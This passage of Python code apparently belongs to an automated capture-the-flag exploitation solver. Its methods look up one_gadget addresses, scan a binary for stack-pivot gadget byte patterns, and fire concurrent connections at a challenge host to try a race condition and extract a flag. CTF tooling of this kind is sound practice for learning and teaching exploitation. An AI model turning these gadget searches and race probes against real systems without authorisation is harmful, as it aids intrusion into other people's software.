        try:
            # Try to run one_gadget tool
            output = subprocess.check_output(['one_gadget', str(binary_path)],
                                           stderr=subprocess.DEVNULL,
                                           timeout=30).decode('utf-8', errors='ignore')
            
            # Parse one_gadget output
            gadgets = re.findall(r'(0x[0-9a-f]+)', output)
            if gadgets:
                result.add_log(f"Found {len(gadgets)} one_gadgets")
                for g in gadgets[:5]:
                    result.add_log(f"  {g}")
        except FileNotFoundError:
            result.add_log("one_gadget tool not installed")
        except Exception as e:
            result.add_log(f"one_gadget error: {e}")
        
        return None
    
    def _try_stack_pivot(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try stack pivot technique"""
        result.add_log("Testing stack pivot...")
        
        if not binary_path or not binary_path.exists():
            return None
        
        try:
            from pwn import ELF, context
            context.log_level = 'error'
            
            elf = ELF(str(binary_path))
            data = binary_path.read_bytes()
            
            # Look for stack pivot gadgets
            pivot_gadgets = {
                'leave_ret': b'\xc9\xc3',
                'xchg_rax_rsp': b'\x48\x94\xc3',
                'mov_rsp_rbp': b'\x48\x89\xec\xc3',
                'pop_rsp': b'\x5c\xc3',
            }
            
            for name, pattern in pivot_gadgets.items():
                offset = data.find(pattern)
                if offset != -1:
                    addr = elf.address + offset if hasattr(elf, 'address') else offset
                    result.add_log(f"Stack pivot gadget '{name}' at offset {hex(offset)}")
                    
        except ImportError:
            result.add_log("pwntools not available")
        except Exception as e:
            result.add_log(f"Stack pivot error: {e}")
        
        return None
    
    def _try_race_condition(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try race condition exploitation"""
        result.add_log("Testing race condition...")
        
        if not challenge.has_connection:
            return None
        
        try:
            import threading
            from pwn import remote, context
            context.log_level = 'error'
            
            results = []
            
            def race_thread():
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    conn.sendline(b'race')
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    results.append(response)
                except:
                    pass
            
            # Launch multiple threads simultaneously
            threads = [threading.Thread(target=race_thread) for _ in range(10)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            
            for response in results:
                flag = self.extract_flag(response)
                if flag:
                    result.add_log("Race condition successful")
                    return flag
                    
        except ImportError:
            pass
        except Exception as e:
            result.add_log(f"Race condition error: {e}")
        
        return None